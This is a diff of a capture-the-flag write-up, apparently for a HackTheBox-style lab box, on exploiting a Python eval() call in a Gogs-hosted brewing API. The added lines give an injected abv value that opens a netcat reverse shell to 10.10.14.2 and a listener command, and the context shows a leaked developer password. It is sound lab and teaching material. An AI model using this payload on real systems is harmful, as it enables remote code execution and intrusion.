@@ -83,9 +83,9 @@ ebachman
 dinesh
 gilfoyle
 ```
-These are characters from [Silicon Valley](https://en.wikipedia.org/wiki/Silicon_Valley_(TV_series)).
+These are characters from [Silicon Valley](https://en.wikipedia.org/wiki/Silicon_Valley_(TV_series)). I downloaded the repo, and went back to the Gogs site.
 
-I look through each one's commits and issues. Dinesh raised an issue about a bogus abv value that had interesting data. 
+I look through all commits and issues. Dinesh raised an issue about a bogus abv value that had interesting data. 
 
 ![Screenshot from 2019-07-30 20-10-33](https://user-images.githubusercontent.com/46615118/62796534-2253e280-ba9f-11e9-94d7-bb909b8b89a7.jpg)
 
@@ -93,7 +93,7 @@ I look through each one's commits and issues. Dinesh raised an issue about a bog
 
 ![Screenshot from 2019-08-01 20-41-54](https://user-images.githubusercontent.com/46615118/62798022-e15dcd00-baa2-11e9-897e-94cca92d22ef.jpg)
 
-In commit `c414b16057` Dinesh added a "fix" to the `brew.py` endpoint. Unfortunately he used the `eval()` function in his python. The `eval()` function conveniently allows us to execute arbitrary strings as python code. 
+In commit `c414b16057` Dinesh added a "fix" to the `brew.py` endpoint. Unfortunately he used the `eval` function in his python. The `eval` function conveniently allows us to execute arbitrary strings as python code. 
 
 ```python
 def post(self):
@@ -119,7 +119,17 @@ dinesh:4aUh0A8PbVjxgd
 
 ### Gaining Access
 
-I had previously downloaded the repo to my machine
+I can use the info that Dinesh left exposed. Having downloaded the repo earlier, I can copy and modify the `tests.py` script locally and use it to exploit the `eval` vulnerability. Mark Bagget's talk mentioned earlier gave me an idea of how to attempt the exploit with the `__import__` function.
+
+-code-
+
+The above code allowed me to ping myself from the craft box. Awesome! Now let's try a reverse shell. After trying a few things, I set up a netcat listner on port `10000/tcp` (`nc -nlvp 10000`) and fed the following to the `eval` function:
+
+```python
+brew_dict['abv'] = '__import__(\"os\").system(\"nc 10.10.14.2 10000 \-e \/bin\/sh\") # Works! Limited reverse shell!!
+```
+
+
 ### Lessons Learned
 - learned a lot about modules, packages, and `import` in python. This was nice.
 - I read almost every bit of code in this project looking for ways to leak data. It helped out a ton.
